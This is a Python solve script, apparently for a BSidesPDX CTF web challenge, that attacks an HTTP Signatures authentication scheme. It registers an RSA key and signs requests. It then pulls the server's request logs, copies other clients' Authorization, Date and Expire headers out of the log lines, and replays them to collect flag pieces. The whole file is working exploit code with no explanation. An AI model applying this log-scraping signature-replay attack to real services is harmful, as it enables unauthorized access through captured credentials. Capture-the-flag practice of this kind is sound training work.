#!/usr/bin/env python

import base64
from datetime import datetime,timezone
import requests
import sys

from Crypto.Hash import SHA256
from Crypto.PublicKey import RSA
from Crypto.Signature import pkcs1_15

host = "http://cavage-enough-for-you.bsidespdxctf.party:1337"
keyId = "geech4"

with open("key/public.pem", "r") as f:
    pubkey = f.read()

with open("key/private.pem", "r") as f:
    privkey = RSA.import_key(f.read())

def addkey():
    r = requests.post(host + "/addkey", json={
        "kid": keyId,
        "rsapub": pubkey
    })

def make_signed_req(method, uri, json=None, data=None):
    url = host + uri

    dt_now = datetime.now(tz=timezone.utc)
    date = dt_now.strftime("%a, %d %b %Y %H:%M:%S GMT")
    
    contents = f"""(request-target): {method.lower()} {uri}
host: cavage-enough-for-you.bsidespdxctf.party:1337
date: {date}"""

    digest = SHA256.new()
    digest.update(contents.encode())

    signer = pkcs1_15.new(privkey)
    signature = base64.b64encode(signer.sign(digest)).decode()

    authorization = "Signature "
    authorization += f'keyId="{keyId}",'
    authorization += 'algorithm="rsa-sha256",'
    authorization += 'headers="(request-target) host date",'
    authorization += f'signature="{signature}"'

    headers = {
        "Date": date,
        "Authorization": authorization
    }

    if method == "GET":
        f = requests.get
    elif method == "POST":
        f = requests.post
    else:
        print("bad method")
        return

    return f(url, headers=headers, json=json, data=data)

def hello():
    r = make_signed_req("GET", "/hello")
    print(r.content.decode())

def logs():
    r = make_signed_req("GET", "/logs")
    return r.content.decode().split("\n")

def ascii():
    r = make_signed_req("GET", "/ascii")
    print(r.content.decode())

def use_log_to_replay(log_line):
    signature = log_line.split("Authorization:[")[1].split("]")[0]
    date = log_line.split("Date:[")[1].split("]")[0]
    expire = log_line.split("Expire:[")[1].split("]")[0]

    headers = {
        "Date": date,
        "Expire": expire,
        "Authorization": signature
    }

    uri = log_line.split(":1337")[1][:7]

    r = requests.get(f"http://web300-server.bsidespdxctf:1337{uri}", headers=headers)
    flag = r.content.decode()

    return flag

def main(argv):
    addkey()

    log = logs()
    lines = []
    lines.append(log[-2])
    lines.append(log[-5])
    lines.append(log[-8])
    lines.append(log[-11])
    lines.append(log[-14])

    flag = ""

    for l in lines[::-1]:
        flag += use_log_to_replay(l)

    print(flag)

    return 0

if __name__ == "__main__":
    sys.exit(main(sys.argv))
